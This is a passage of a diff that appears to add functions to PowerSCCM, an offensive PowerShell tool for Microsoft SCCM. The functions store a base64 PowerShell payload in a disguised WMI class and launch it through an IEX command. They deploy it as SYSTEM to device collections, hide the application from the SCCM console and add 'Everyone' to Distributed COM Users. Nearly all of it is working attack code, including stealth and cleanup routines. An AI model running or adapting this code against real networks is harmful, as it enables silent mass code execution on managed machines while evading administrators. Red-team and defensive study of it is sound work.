+        An ASCII-base64 encoded PowerShell blob to execute for a target collection.
+    
+    .PARAMETER PowerShellUnicodeB64
+
+        An UNICODE-base64 encoded PowerShell blob to execute for a target collection.
+
+    .PARAMETER UNCProgram
+
+        The \\UNC\ path to a program to execute for a target collection.
+
+    .EXAMPLE
+
+        PS C:\> Get-SccmSession | New-SccmApplication -ApplicationName "TotallyLegit" -PowerShellB64 "Y21kIC9jIGNhbGMuZXhlCg=="
+
+        Creates a new application via WMI that is called "Totally Legit" and will execute 'cmd /c calc.exe'
+#>
+    [CmdletBinding(DefaultParameterSetName = 'PowerShellScript')]
+    param(
+        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline=$True)]
+        [ValidateScript({ $_.PSObject.TypeNames -contains 'PowerSccm.Session'})]
+        $Session,
+
+        [Parameter(Mandatory = $True)]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $ApplicationName,
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $WorkingDirectory = 'C:\Windows\System32',
+
+        [Parameter(ParameterSetName = 'PowerShellScript', Mandatory = $True)]
+        [String]
+        $PowerShellScript,
+
+        [Parameter(ParameterSetName = 'UNCProgram', Mandatory = $True)]
+        [String]
+        $UNCProgram,
+
+        [Parameter(ParameterSetName = 'PowerShellB64', Mandatory = $True)]
+        [String]
+        $PowerShellB64,
+
+        [Parameter(ParameterSetName = 'PowerShellUnicodeB64', Mandatory = $True)]
+        [String]
+        $PowerShellUnicodeB64,
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $PayloadNamespace = 'root\Microsoft\Windows',
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $PayloadClassName = 'Win32_Debug'
+    )
+
+    process {
+
+        if($Session.ConnectionType -notlike 'WMI') {
+            throw "SQL functionality for New-SccmCollection not yet implemented in PowerSCCM, please use a WMI connection."
+        }
+
+        # handle the specifics of the application we're going to deploy
+        if ($PSBoundParameters.ContainsKey("UNCProgram")) {
+            $LaunchCMD = $UNCProgram
+        }
+        else {
+            $WorkingDirectory = "C:\Windows\System32\WindowsPowerShell\v1.0"
+
+            if ($PSBoundParameters.ContainsKey("PowerShellScript")) {
+                $Bytes = ([Text.Encoding]::ASCII).GetBytes($PSScript)
+                $Encoded = [System.Convert]::ToBase64String($Bytes)
+            }
+
+            elseif ($PSBoundParameters.ContainsKey("PowerShellB64")) {
+                $Encoded = $PowerShellB64
+            }
+            elseif ($PSBoundParameters.ContainsKey("PowerShellUnicodeB64")) {
+                # decode the string from unicode, then re-encode in ASCII base64
+                $Unicode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($PowerShellUnicodeB64))
+                $Encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($Unicode))
+            }
+            else {
+                throw "Invalid payload/program specification!"
+            }
+
+            if($Session.Credential) {
+                # push the base64 string custom WMI class on the remote server
+                $Payload = Push-WmiPayload -Payload $Encoded -ComputerName $Session.ComputerName -Credential $Session.Credential -Namespace $PayloadNamespace -ClassName $PayloadClassName
+
+                # grant universal read permissions to the payload class
+                Grant-WmiNameSpaceRead -ComputerName $Session.ComputerName -Credential $Session.Credential -Namespace $PayloadNamespace
+            }
+            else {
+                # push the base64 string custom WMI class on the remote server
+                $Payload = Push-WmiPayload -Payload $Encoded -ComputerName $Session.ComputerName -Namespace $PayloadNamespace -ClassName $PayloadClassName
+
+                # grant universal read permissions to the payload class
+                Grant-WmiNameSpaceRead -ComputerName $Session.ComputerName -Namespace $PayloadNamespace
+            }
+            $LaunchCMD = $Payload.LaunchCMD
+        }
+
+        if(!$LaunchCMD) {
+            throw "Invalid payload/program specification!"
+        }
+
+        # Generate SCOPEID
+        if($Session.Credential) {
+            $IdentificationClass = Get-WmiObject -List -ComputerName $Session.ComputerName -NameSpace "Root\SMS\site_$($Session.SiteCode)" -Class SMS_Identification -Credential $Session.Credential
+            $ApplicationClass = Get-WmiObject -List -ComputerName $Session.ComputerName -NameSpace "Root\SMS\site_$($Session.SiteCode)" -Class SMS_Application -Credential $Session.Credential
+        }
+        else {
+            $IdentificationClass = Get-WmiObject -List -ComputerName $Session.ComputerName -NameSpace "Root\SMS\site_$($Session.SiteCode)" -Class SMS_Identification
+            $ApplicationClass = Get-WmiObject -List -ComputerName $Session.ComputerName -NameSpace "Root\SMS\site_$($Session.SiteCode)" -Class SMS_Application
+        }
+        $ScopeID = "ScopeId_" + $IdentificationClass.GetSiteID().SiteID -replace "{","" -replace "}",""
+
+        # Generate ApplicationID
+        $NewApplicationID = "Application_" + [guid]::NewGuid().ToString()
+        
+        # Generate DeploymentID
+        $NewDeploymentID = "DeploymentType_" + [guid]::NewGuid().ToString()
+        $NewFileID = "File_" + [guid]::NewGuid().ToString()
+        
+        $Xml = 
+@"
+<?xml version="1.0" encoding="utf-16"?><AppMgmtDigest xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><Application AuthoringScopeId="${ScopeID}" LogicalName="${newApplicationID}" Version="2"><DisplayInfo DefaultLanguage="en-US"><Info Language="en-US"><Title>${ApplicationName}</Title><Publisher/><Version/></Info></DisplayInfo><DeploymentTypes><DeploymentType AuthoringScopeId="${ScopeID}" LogicalName="${newDeploymentID}" Version="2"/></DeploymentTypes><Title ResourceId="Res_684364143">${ApplicationName}</Title><Description ResourceId="Res_1018411239"/><Publisher ResourceId="Res_1340020890"/><SoftwareVersion ResourceId="Res_597041892"/><CustomId ResourceId="Res_872061892"/></Application><DeploymentType AuthoringScopeId="${ScopeID}" LogicalName="${newDeploymentID}" Version="2"><Title ResourceId="Res_1244298486">${ApplicationName}</Title><Description ResourceId="Res_405397997"/><DeploymentTechnology>GLOBAL/ScriptDeploymentTechnology</DeploymentTechnology><Technology>Script</Technology><Hosting>Native</Hosting><Installer Technology="Script"><ExecutionContext>System</ExecutionContext><DetectAction><Provider>Local</Provider><Args><Arg Name="ExecutionContext" Type="String">System</Arg><Arg Name="MethodBody" Type="String">&lt;?xml version="1.0" encoding="utf-16"?&gt;
+&lt;EnhancedDetectionMethod xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"&gt;
+  &lt;Settings xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"&gt;
+    &lt;File Is64Bit="false" LogicalName="${NewFileID}" xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration"&gt;
+      &lt;Annotation xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"&gt;
+        &lt;DisplayName Text="" /&gt;
+        &lt;Description Text="" /&gt;
+      &lt;/Annotation&gt;
+      &lt;Path&gt;C:\&lt;/Path&gt;
+      &lt;Filter&gt;asdf&lt;/Filter&gt;
+    &lt;/File&gt;
+  &lt;/Settings&gt;
+  &lt;Rule id="${ScopeID}/${newDeploymentID}" Severity="Informational" NonCompliantWhenSettingIsNotFound="false" xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"&gt;
+    &lt;Annotation&gt;
+      &lt;DisplayName Text="" /&gt;
+      &lt;Description Text="" /&gt;
+    &lt;/Annotation&gt;
+    &lt;Expression&gt;
+      &lt;Operator&gt;NotEquals&lt;/Operator&gt;
+      &lt;Operands&gt;
+        &lt;SettingReference AuthoringScopeId="${ScopeID}" LogicalName="${newApplicationID}" Version="2" DataType="Int64" SettingLogicalName="${NewFileID}" SettingSourceType="File" Method="Count" Changeable="false" /&gt;
+        &lt;ConstantValue Value="0" DataType="Int64" /&gt;
+      &lt;/Operands&gt;
+    &lt;/Expression&gt;
+  &lt;/Rule&gt;
+&lt;/EnhancedDetectionMethod&gt;</Arg></Args></DetectAction><InstallAction><Provider>Script</Provider><Args><Arg Name="InstallCommandLine" Type="String">${LaunchCMD}</Arg><Arg Name="WorkingDirectory" Type="String">${WorkingDirectory}</Arg><Arg Name="ExecutionContext" Type="String">System</Arg><Arg Name="RequiresLogOn" Type="String"/><Arg Name="RequiresElevatedRights" Type="Boolean">false</Arg><Arg Name="RequiresUserInteraction" Type="Boolean">false</Arg><Arg Name="RequiresReboot" Type="Boolean">false</Arg><Arg Name="UserInteractionMode" Type="String">Hidden</Arg><Arg Name="PostInstallBehavior" Type="String">BasedOnExitCode</Arg><Arg Name="ExecuteTime" Type="Int32">0</Arg><Arg Name="MaxExecuteTime" Type="Int32">120</Arg><Arg Name="RunAs32Bit" Type="Boolean">false</Arg><Arg Name="SuccessExitCodes" Type="Int32[]"><Item>0</Item><Item>1707</Item></Arg><Arg Name="RebootExitCodes" Type="Int32[]"><Item>3010</Item></Arg><Arg Name="HardRebootExitCodes" Type="Int32[]"><Item>1641</Item></Arg><Arg Name="FastRetryExitCodes" Type="Int32[]"><Item>1618</Item></Arg></Args></InstallAction><CustomData><DetectionMethod>Enhanced</DetectionMethod><EnhancedDetectionMethod><Settings xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"><File xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration" Is64Bit="false" LogicalName="${NewFileID}"><Annotation xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"><DisplayName Text=""/><Description Text=""/></Annotation><Path>C:\</Path><Filter>asdf</Filter></File></Settings><Rule xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules" id="${ScopeID}/${newDeploymentID}" Severity="Informational" NonCompliantWhenSettingIsNotFound="false"><Annotation><DisplayName Text=""/><Description Text=""/></Annotation><Expression><Operator>NotEquals</Operator><Operands><SettingReference AuthoringScopeId="${ScopeID}" LogicalName="${newApplicationID}" Version="2" DataType="Int64" SettingLogicalName="${NewFileID}" SettingSourceType="File" Method="Count" Changeable="false"/><ConstantValue Value="0" DataType="Int64"/></Operands></Expression></Rule></EnhancedDetectionMethod><InstallCommandLine>${LaunchCMD}</InstallCommandLine><InstallFolder>${WorkingDirectory}</InstallFolder><ExitCodes><ExitCode Code="0" Class="Success"/><ExitCode Code="1707" Class="Success"/><ExitCode Code="3010" Class="SoftReboot"/><ExitCode Code="1641" Class="HardReboot"/><ExitCode Code="1618" Class="FastRetry"/></ExitCodes><UserInteractionMode>Hidden</UserInteractionMode><AllowUninstall>true</AllowUninstall></CustomData></Installer></DeploymentType></AppMgmtDigest>
+"@
+
+        $Application = $ApplicationClass.PSBase.CreateInstance()
+        
+        # set XML to SDMPackageXML
+        $Application.SDMPackageXML = $Xml
+
+        # hide the collection from display in the SCCM GUI ;)
+        $Application.IsHidden = $True
+
+        # create the collection
+        $Null = $Application.PSBase.Put()
+
+        $Properties = @{
+            'ApplicationName' = $ApplicationName
+            'LaunchCMD' = $LaunchCMD
+            'ApplicationID' = $NewApplicationID
+            'DeploymentID' = $NewDeploymentID
+            'ScopeID' = $ScopeID
+            'FileID' = $NewFileID
+        }
+        New-Object PSObject -Property $Properties
+    }
+}
+
+
+function Remove-SccmApplication {
+<#
+    .SYNOPSIS
+
+        Deletes a SCCM application.
+
+    .PARAMETER Session
+
+        The custom PowerSccm.Session object to query, generated/stored by New-SccmSession
+        and retrievable with Get-SccmSession. Required. Passable on the pipeline.
+
+    .PARAMETER ApplicationName
+
+        The name of the Sccm application to remove.
+
+    .PARAMETER PayloadNamespace
+
+        The WMI namespace to remove a WMI PowerShell payload from.
+
+    .PARAMETER PayloadClassName
+
+        The WMI classname to remove.
+
+    .EXAMPLE
+
+        PS C:\> Get-SccmSession | Remove-SccmApplication -ApplicationName "TotallyLegit"
+
+        Delete an application named "TotallyLegit"
+#>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $True, ValueFromPipeline=$True)]
+        [ValidateScript({ $_.PSObject.TypeNames -contains 'PowerSccm.Session'})]
+        $Session,
+
+        [Parameter(Mandatory = $True)]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $ApplicationName,
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $PayloadNamespace = 'root\Microsoft\Windows',
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $PayloadClassName = 'Win32_Debug'
+    )
+
+    process {
+        
+        if($Session.ConnectionType -notlike 'WMI') {
+            throw "SQL functionality for New-SccmCollection not yet implemented in PowerSCCM, please use a WMI connection."
+        }
+
+        if($Session.Credential) {
+            # Retire the application
+            Get-WmiObject -ComputerName $Session.ComputerName -NameSpace "ROOT\SMS\site_$($Session.SiteCode)" -Class SMS_Application -Credential $Session.Credential | Where-Object {$_.LocalizedDisplayName -like $ApplicationName} | ForEach-Object {
+                $Null = $_.PSBase.InvokeMethod("SetIsExpired","True")
+            }
+
+            # Delete the application
+            Get-WmiObject -ComputerName $Session.ComputerName -NameSpace "ROOT\SMS\site_$($Session.SiteCode)" -Class SMS_Application -Credential $Session.Credential | Where-Object {$_.LocalizedDisplayName -like $ApplicationName} | Remove-WMIObject
+
+            # Remove "Everyone" from the "Distributed COM Users" group and revoke
+            #   the universal read on the namespace
+            Revoke-WMiNameSpaceRead -ComputerName $Session.ComputerName -Credential $Session.Credential -Namespace $PayloadNamespace
+
+            # Remove the custom WMI class
+            Remove-WMIPayload -ComputerName $Session.ComputerName -Credential $Session.Credential -Namespace $PayloadNamespace -ClassName $PayloadClassName
+        }
+        else {
+            # Retire the application
+            Get-WmiObject -ComputerName $Session.ComputerName -NameSpace "ROOT\SMS\site_$($Session.SiteCode)" -Class SMS_Application | Where-Object {$_.LocalizedDisplayName -like $ApplicationName} | ForEach-Object {
+                $Null = $_.PSBase.InvokeMethod("SetIsExpired","True")
+            }
+
+            # Delete the application
+            Get-WmiObject -ComputerName $Session.ComputerName -NameSpace "ROOT\SMS\site_$($Session.SiteCode)" -Class SMS_Application | Where-Object {$_.LocalizedDisplayName -like $ApplicationName} | Remove-WMIObject
+
+            # Remove "Everyone" from the "Distributed COM Users" group and revoke
+            #   the universal read on the namespace
+            Revoke-WMiNameSpaceRead -ComputerName $Session.ComputerName -Namespace $PayloadNamespace
+
+            # Remove the custom WMI class
+            Remove-WmiPayload -ComputerName $Session.ComputerName -Namespace $PayloadNamespace -ClassName $PayloadClassName
+        }
+    }
+}
+
+
+function New-SccmApplicationDeployment {
+<#
+    .SYNOPSIS
+
+        Deploys an application to a specific collection.
+
+    .PARAMETER Session
+
+        The custom PowerSccm.Session object to query, generated/stored by New-SccmSession
+        and retrievable with Get-SccmSession. Required. Passable on the pipeline.
+
+    .PARAMETER ApplicationName
+
+        Name of the application you would like to deploy.
+
+    .PARAMETER AssignmentName
+
+        Name of the deployment.
+
+    .PARAMETER CollectionName
+
+        Name of the collection you would like to deploy the application to.
+
+    .EXAMPLE
+
+        PS C:\> Get-SccmSession | New-SccmApplicationDeployment -ApplicationName "TotallyLegit" -AssignmentName "SeemsLegit" -CollectionName "hax"
+
+        Deployed the application "TotallyLegit" to the Collection "hax" with the Deployment name of "SeemsLegit"
+#>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $True, ValueFromPipeline=$True)]
+        [ValidateScript({ $_.PSObject.TypeNames -contains 'PowerSccm.Session'})]
+        $Session,
+
+        [Parameter(Mandatory = $True)]
+        [String]
+        $ApplicationName,
+
+        [Parameter(Mandatory = $True)]
+        [String]
+        $AssignmentName,
+
+        [Parameter(Mandatory = $True)]
+        [String]
+        $CollectionName
+    )
+
+    process {
+
+        if($Session.ConnectionType -notlike 'WMI') {
+            throw "SQL functionality for New-SccmCollection not yet implemented in PowerSCCM, please use a WMI connection."
+        }
+
+        if($Session.Credential){
+             $ApplicationAssignmentClass = get-wmiobject -List -ComputerName $Session.ComputerName -NameSpace "Root\SMS\site_$($Session.SiteCode)" -Class SMS_ApplicationAssignment -Credential $Session.Credential
+              # Gather required info about the application of choice
+             $TargetCollectionID = Get-WmiObject -ComputerName $Session.ComputerName -Namespace "root\sms\site_$($Session.SiteCode)" -Class SMS_Collection -Credential $Session.Credential | ?{$_.Name -eq $CollectionName} | Select-Object -Expand CollectionID
+             $CI = Get-WmiObject -ComputerName $Session.ComputerName -Namespace "root\sms\site_$($Session.SiteCode)" -Class SMS_Application -Credential $Session.Credential | ?{$_.LocalizedDisplayName -eq $ApplicationName} | Select-Object -Expand CI_ID 
+
+        }
+        else {
+            $ApplicationAssignmentClass = get-wmiobject -List -ComputerName $Session.ComputerName -NameSpace "Root\SMS\site_$($Session.SiteCode)" -Class SMS_ApplicationAssignment
+             # Gather required info about the application of choice
+            $TargetCollectionID = Get-WmiObject -ComputerName $Session.ComputerName -Namespace "root\sms\site_$($Session.SiteCode)" -Class SMS_Collection | ?{$_.Name -eq $CollectionName} | Select-Object -Expand CollectionID
+            $CI = Get-WmiObject -ComputerName $Session.ComputerName -Namespace "root\sms\site_$($Session.SiteCode)" -Class SMS_Application | ?{$_.LocalizedDisplayName -eq $ApplicationName} | Select-Object -Expand CI_ID
+        }
+
+        $ApplicationAssignment = $ApplicationAssignmentClass.PSBase.CreateInstance()
+       
+        $Format = Get-Date -Format yyyyMMddHHmmss
+        $Date = $Format + ".000000+***"
+
+        # Set all required options within the WMI class
+        $ApplicationAssignment.ApplicationName = $ApplicationName
+        $ApplicationAssignment.AssignmentName = $AssignmentName
+        $ApplicationAssignment.AssignedCIs = $CI
+        $ApplicationAssignment.AssignmentAction = 2
+        $ApplicationAssignment.DesiredConfigType = 1
+        $ApplicationAssignment.LogComplianceToWinEvent = $False
+        $ApplicationAssignment.CollectionName = $CollectionName
+        $ApplicationAssignment.CreationTime = $Date
+        $ApplicationAssignment.LocaleID = 1033
+        $ApplicationAssignment.SourceSite = $Site
+        $ApplicationAssignment.StartTime = $Date
+        $ApplicationAssignment.DisableMOMAlerts = $True
+        $ApplicationAssignment.SuppressReboot = $False
+        $ApplicationAssignment.NotifyUser = $False
+        $ApplicationAssignment.TargetCollectionID = $TargetCollectionID
+        $ApplicationAssignment.EnforcementDeadline = $Date
+        $ApplicationAssignment.OfferTypeID = 0
+        $ApplicationAssignment.OfferFlags = 0
+        $ApplicationAssignment.Priority = 2
+        $ApplicationAssignment.UserUIExperience = $False
+        $ApplicationAssignment.WoLEnabled = $False
+        $ApplicationAssignment.RebootOutsideOfServiceWindows = $False
+        $ApplicationAssignment.OverrideServiceWindows = $False
+        $ApplicationAssignment.UseGMTTimes = $True
+
+        # Submit deployment
+        $Null = $ApplicationAssignment.psbase.put()
+
+        $Properties = @{
+            'DeplymentName' = $AssignmentName
+            'ApplicationName' = $ApplicationName
+            'CollectionName' = $CollectionName
+        }
+        New-Object PSObject -Property $Properties
+    }
+}
+
+
+function Remove-SccmApplicationDeployment {
+<#
+    .SYNOPSIS
+
+        Deletes a SCCM application deployment.
+
+    .PARAMETER Session
+
+        The custom PowerSccm.Session object to query, generated/stored by New-SccmSession
+        and retrievable with Get-SccmSession. Required. Passable on the pipeline.
+
+    .PARAMETER ApplicationName
+
+        The name of the Sccm application to remove the deployment for.
+
+    .EXAMPLE
+
+        PS C:\> Get-SccmSession | Remove-SccmApplicationDeployment -ApplicationName "TotallyLegit"
+
+        Delete any deployments for the application "TotallyLegit"
+#>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $True, ValueFromPipeline=$True)]
+        [ValidateScript({ $_.PSObject.TypeNames -contains 'PowerSccm.Session'})]
+        $Session,
+
+        [Parameter(Mandatory = $True)]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $ApplicationName
+    )
+
+    process {
+        
+        if($Session.ConnectionType -notlike 'WMI') {
+            throw "SQL functionality for New-SccmCollection not yet implemented in PowerSCCM, please use a WMI connection."
+        }
+
+        if($Session.Credential) {
+            Get-WmiObject -ComputerName $Session.ComputerName -NameSpace "ROOT\SMS\site_$($Session.SiteCode)" -Class SMS_ApplicationAssignment -Credential $Session.Credential | Where-Object {$_.ApplicationName -like $ApplicationName} | Remove-WMIObject
+        }
+        else {
+            Get-WmiObject -ComputerName $Session.ComputerName -NameSpace "ROOT\SMS\site_$($Session.SiteCode)" -Class SMS_ApplicationAssignment | Where-Object {$_.ApplicationName -like $ApplicationName} | Remove-WMIObject
+        }
+    }
+}
+
+
+function Push-WmiPayload {
+<#
+    .SYNOPSIS
+    
+        Saves a chunk of text ($Payload) into a newly created WMI class/property
+        on a remote (or local) system. The payload/class can be removed with
+        Remove-WmiPayload.
+   
+    .PARAMETER Payload
+
+        The text payload to set in the custom class property.
+   
+    .PARAMETER Namespace
+
+        The WMI namespace to create the custom WMI ClassName in.
+
+    .PARAMETER ClassName
+
+        The classname to create.
+
+    .PARAMETER PropertyName
+
+        The property name of the class to stuff the payload in.
+
+    .PARAMETER ComputerName
+
+        The computer to push the WMI payload to.
+
+    .PARAMETER Credential
+
+        A [Management.Automation.PSCredential] object to use for the remote connection.
+    
+    .EXAMPLE
+
+        PS C:\> Push-WmiPayload -Payload $Payload
+
+    .EXAMPLE
+
+        PS C:\> $Cred = Get-Credential
+        PS C:\> Push-WmiPayload -Payload $Payload -NameSpace root\microsoft -ComputerName sccm.testlab.local -Credential $Cred
+
+    .LINK
+
+        http://itknowledgeexchange.techtarget.com/powershell/create-a-process-on-a-remote-machine/
+#>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $True)]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $Payload,
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $NameSpace = 'root\Microsoft\Windows',
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $ClassName = 'Win32_Debug',
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $PropertyName = 'Prop',
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $ComputerName,
+
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential = [Management.Automation.PSCredential]::Empty
+    )
+    
+    $NameSpace = $NameSpace.Replace('/', '\')
+    $ConnectionScope = New-Object System.Management.ManagementScope
+
+    if ($PSBoundParameters.ContainsKey("ComputerName")) {
+        # adapted from http://itknowledgeexchange.techtarget.com/powershell/create-a-process-on-a-remote-machine/
+        $ConnectionOptions = New-Object System.Management.ConnectionOptions
+
+        if ($PSBoundParameters.ContainsKey("Credential")) {
+            $ConnectionOptions.UserName = $Credential.UserName
+            $ConnectionOptions.SecurePassword = $Credential.Password
+        }
+
+        $ConnectionScope.Path = "\\$ComputerName\$NameSpace"
+        $ConnectionScope.Options = $ConnectionOptions  
+    }
+    else {
+        $ConnectionScope = $NameSpace
+        $ComputerName = $ENV:COMPUTERNAME
+    }
+
+    try {
+        # create the Wmi class itself
+        $WmiClass = New-Object Management.ManagementClass($ConnectionScope, $Null, $Null)
+        $WmiClass.Name = $ClassName
+        $Null = $WmiClass.Put()
+
+        # add the $Payload argument to the specified property name
+        $WmiClass.Properties.Add($PropertyName, $Payload)
+        $Null = $WmiClass.Put()
+
+        $LaunchCMD = "powershell -c `"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(([WMIClass]'\\${ComputerName}\${NameSpace}:${ClassName}').properties['${PropertyName}'].Value)))`""
+        $Object = New-Object PSObject
+        $Object | Add-Member Noteproperty 'LaunchCMD' $LaunchCMD
+        $Object | Add-Member Noteproperty 'ComputerName' $ComputerName
+        $Object | Add-Member Noteproperty 'NameSpace' $NameSpace
+        $Object | Add-Member Noteproperty 'ClassName' $ClassName
+        $Object | Add-Member Noteproperty 'PropertyName' $PropertyName
+        $Object
+    }
+    catch {
+        Write-Error $_
+    }
+}
+
+
+function Remove-WmiPayload {
+<#
+    .SYNOPSIS
+    
+        Removes a saved WMI payload pushed by Push-WmiPayload.
+   
+    .PARAMETER Namespace
+
+        The WMI namespace to the custom WMI ClassName resides in.
+
+    .PARAMETER ClassName
+
+        The classname to remove.
+
+    .PARAMETER ComputerName
+
+        The computer to remove the WMI payload from.
+
+    .PARAMETER Credential
+
+        A [Management.Automation.PSCredential] object to use for the remote connection.
+    
+    .LINK
+
+        http://itknowledgeexchange.techtarget.com/powershell/create-a-process-on-a-remote-machine/
+#>
+    [CmdletBinding()]
+    param(
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $NameSpace = 'root\Microsoft\Windows',
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $ClassName = 'Win32_Debug',
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $ComputerName,
+
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential = [Management.Automation.PSCredential]::Empty
+    )
+    
+    $NameSpace = $NameSpace.Replace('/', '\')
+
+    if($PSBoundParameters.ContainsKey("ComputerName")) {
+
+        $Path = "\\${ComputerName}\${NameSpace}:${ClassName}"
+
+        if($PSBoundParameters.ContainsKey("Credential")) {
+            Remove-WmiObject -Path $Path -Credential $Credential
+        }
+        else {
+            Remove-WmiObject -Path $Path
+        } 
+    }
+    else {
+        Remove-WmiObject -Path "${NameSpace}:${ClassName}"
+    }
+}
+
+
+function Grant-WmiNameSpaceRead {
+<#
+    .SYNOPSIS
+    
+        Grants remote read access to 'Everyone' for a given WMI namespace.
+        Access can be revoked with Revoke-WmiNameSpaceRead.
+        Heavily adapted from Steve Lee's example code on MSDN, originally licenses
+   
+    .PARAMETER Namespace
+
+        Namespace to allow a read permission form.   
+
+    .PARAMETER ComputerName
+
+        The computer to grant read access to the specified namespace on.
+
+    .PARAMETER Credential
+
+        A [Management.Automation.PSCredential] object to use for the remote connection.
+
+    .EXAMPLE
+
+        PS C:\> Grant-WmiNameSpaceRead -NameSpace 'root\Microsoft\Windows'
+
+    .EXAMPLE
+
+        PS C:\> $Cred = Get-Credential
+        PS C:\> Grant-WmiNameSpaceRead -NameSpace 'root\Microsoft\Windows' -ComputerName sccm.testlab -Credential $Cred
+
+    .LINK
+
+        http://blogs.msdn.com/b/wmi/archive/2009/07/27/scripting-wmi-namespace-security-part-3-of-3.aspx
+        http://vniklas.djungeln.se/2012/08/22/set-up-non-admin-account-to-access-wmi-and-performance-data-remotely-with-powershell/
+#>
+    [CmdletBinding()]
+    param(
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $NameSpace = 'root\Microsoft\Windows',
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $ComputerName = ".",
+
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential = [Management.Automation.PSCredential]::Empty
+    )    
+
+    # needed for non-DCs - add 'Everyone' to the 'Distributed COM Users' localgroup
+    $Group = [ADSI]("WinNT://$ComputerName/Distributed COM Users,group")
+
+    if ($PSBoundParameters.ContainsKey("Credential")) {
+        $Params = @{Namespace=$Namespace; Path="__systemsecurity=@"; ComputerName=$ComputerName; Credential=$Credential}
+
+        # alternate credentials for the adsi WinNT service provider
+        $Group.PsBase.Username = $Credential.Username
+        $Group.PsBase.Password = $Credential.GetNetworkCredential().Password
+    }
+    else {
+        $Params = @{Namespace=$Namespace; Path="__systemsecurity=@"; ComputerName=$ComputerName}
+    }
+
+    try {
+        # actually add 'Everyone' to 'Distributed COM Users'
+        $Group.Add("WinNT://everyone,user")
+    }
+    catch {
+        Write-Warning $_
+    }
+
+    $WmiObjectAcl = $(Invoke-WmiMethod -Name GetSecurityDescriptor @Params).Descriptor
+
+    # 33 = enable + remote access
+    $WmiAce = (New-Object System.Management.ManagementClass("win32_Ace")).CreateInstance()
+    $WmiAce.AccessMask = 33
+    $WmiAce.AceFlags = 0
+
+    $WmiTrustee = (New-Object System.Management.ManagementClass("win32_Trustee")).CreateInstance()
+    
+    # sid of "S-1-1-0" = "Everyone"
+    $WmiTrustee.SidString = "S-1-1-0"
+    $WmiAce.Trustee = $WmiTrustee
+    $WmiAce.AceType = 0x0
+    $WmiObjectacl.DACL += $WmiAce.PSObject.ImmediateBaseObject
+
+    $Params += @{Name="SetSecurityDescriptor"; ArgumentList=$WmiObjectAcl.PSObject.ImmediateBaseObject}
+    $Output = Invoke-WmiMethod @Params
+    if ($Output.ReturnValue -ne 0) {
+        throw "SetSecurityDescriptor failed: $($Output.ReturnValue)"
+    }
+}
+
+
+function Revoke-WmiNameSpaceRead {
+<#
+    .SYNOPSIS
+    
+        Removes remote read access from 'Everyone' for a given WMI namespace that
+        was granted by Grant-WmiNameSpaceRead.
+        Heavily adapted from Steve Lee's example code on MSDN, originally licenses
+   
+    .PARAMETER Namespace
+
+        Namespace to allow a read permission form.   
+
+    .PARAMETER ComputerName
+
+        The computer to revoke read access to the specified namespace on.
+
+    .PARAMETER Credential
+
+        A [Management.Automation.PSCredential] object to use for the remote connection.
+
+    .EXAMPLE
+
+        PS C:\> Revoke-WmiNameSpaceRead -NameSpace 'root\Microsoft\Windows'
+
+    .EXAMPLE
+
+        PS C:\> $Cred = Get-Credential
+        PS C:\> Revoke-WmiNameSpaceRead -NameSpace 'root\Microsoft\Windows' -ComputerName sccm.testlab -Credential $Cred
+
+    .LINK
+
+        http://blogs.msdn.com/b/wmi/archive/2009/07/27/scripting-wmi-namespace-security-part-3-of-3.aspx
+        http://vniklas.djungeln.se/2012/08/22/set-up-non-admin-account-to-access-wmi-and-performance-data-remotely-with-powershell/
+#>
+    [CmdletBinding()]
+    param(
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $NameSpace = 'root\Microsoft\Windows',
+
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $ComputerName = ".",
+
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential = [Management.Automation.PSCredential]::Empty
+    )    
+
+    $Group = [ADSI]("WinNT://$ComputerName/Distributed COM Users,group")
+
+    if ($PSBoundParameters.ContainsKey("Credential")) {
